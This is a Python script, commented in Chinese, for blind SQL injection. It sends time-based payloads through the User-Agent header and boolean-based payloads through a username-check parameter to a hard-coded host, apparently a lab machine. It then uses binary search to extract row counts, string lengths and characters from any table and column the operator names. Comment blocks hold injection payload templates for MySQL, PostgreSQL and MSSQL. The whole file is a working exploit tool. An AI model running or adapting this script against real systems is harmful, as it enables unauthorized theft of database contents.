#!/usr/bin/python3

# SQL盲注脚本 by Sunshine
import requests
import json
import sys
import time
from urllib.parse import urlencode

MODE="time-based"
DELAY = 3
def oracle(expression):
    if (MODE == "time-based"):
        start = time.time()
        r = requests.get(
            "http://10.129.2.104:8080/",
            headers={"User-Agent": f"';IF({expression}) WAITFOR DELAY '0:0:{DELAY}'-- -"}
        )
        if (time.time() - start > DELAY):
            return True
        else:
            return False
    elif (MODE == "boolean-based"):
        payload = f"r4nd0m' OR ({expression})-- -"
        response = requests.get(f'http://10.129.2.104/api/check-username.php?u={payload}')
        if (response.text == '{"status":"taken"}'):
            return True
        elif (response.text == '{"status":"available"}'):
            return False
        else:
            sys.exit()
    else:
        sys.exit()

column = input("SELECT ")
table = input("FROM ")
filters = input("WHERE ")

'''
判断行数
(SELECT COUNT({column}) FROM {table} WHERE {filters}) > {mid}
'''

'''
计算当前行列对应字符串长度
单行
MySQL/PostgreSQL: (SELECT LENGTH({column}) FROM {table} WHERE {filters} LIMIT 1) > {mid}
MSSQL: LEN((SELECT TOP 1 {column} FROM {table} WHERE {filters})) > {mid}

多行
MySQL/PostgreSQL: (SELECT LENGTH({column}) FROM {table} WHERE {filters} ORDER BY {column} LIMIT 1 OFFSET {offset}) > {mid}
MSSQL: LEN((SELECT {column} FROM {table} WHERE {filters} ORDER BY {column} OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY)) > {mid}

函数
MySQL/PostgreSQL: (SELECT LENGTH({column})) > {mid}
'''

'''
dump字符串
MySQL/PostgreSQL:
(SELECT ASCII(SUBSTRING({column},{i),1)) FROM {table} WHERE {filters} LIMIT 1) > {mid}
(SELECT ASCII(SUBSTRING({column},{i),1)) FROM {table} WHERE {filters} ORDER BY {column} LIMIT 1 OFFSET {offset}) > {mid}
MSSQL
ASCII(SUBSTRING((SELECT TOP 1 {column} FROM {table} WHERE {filters}),{i},1)) > {mid}
ASCII(SUBSTRING((SELECT {column} FROM {table} WHERE {filters} ORDER BY {column} OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY),{i},1)) > {mid}
'''

'''
dump整数
MySQL/PostgreSQL
(SELECT {column} FROM {table} WHERE {filters} LIMIT 1) > {mid}
(SELECT {column} FROM {table} WHERE {filters} ORDER BY {column} LIMIT 1 OFFSET {offset}) > {mid}
MSSQL
((SELECT TOP 1 {column} FROM {table} WHERE {filters})) > {mid}
((SELECT {column} FROM {table} WHERE {filters} ORDER BY {column} OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY)) > {mid}
函数
MySQL/PostgreSQL: (SELECT {column}) > {mid}
'''
RowCount = 0
low = 0 # 行数范围
high = 100
while low < high:
    mid = (low + high) // 2
    if oracle(f"(SELECT COUNT({column}) FROM {table} WHERE {filters}) > {mid}"):
        low = mid + 1
    else:
        high = mid
RowCount=low
print(f'{RowCount} row(s) in total')
sys.stdout.flush()
print()

for offset in range(0, RowCount):
    low = 0 # 长度范围
    high = 100
    while low < high:
        mid = (low + high) // 2
        if oracle(f"LEN((SELECT {column} FROM {table} WHERE {filters} ORDER BY {column} OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY)) > {mid}"):
            low = mid + 1
        else:
            high = mid
    length=low
    print(f'Length: {low}', end='')
    sys.stdout.flush()
    print()

    for i in range(1, length + 1):
        low = 32 # 可打印ASCII字符范围 32-127
        high = 127
        while low < high:
            mid = (low + high) // 2
            if oracle(f"ASCII(SUBSTRING((SELECT {column} FROM {table} WHERE {filters} ORDER BY {column} OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY),{i},1)) > {mid}"):
                low = mid + 1
            else:
                high = mid
        print(chr(low), end='')
        sys.stdout.flush()
    print()
    print()
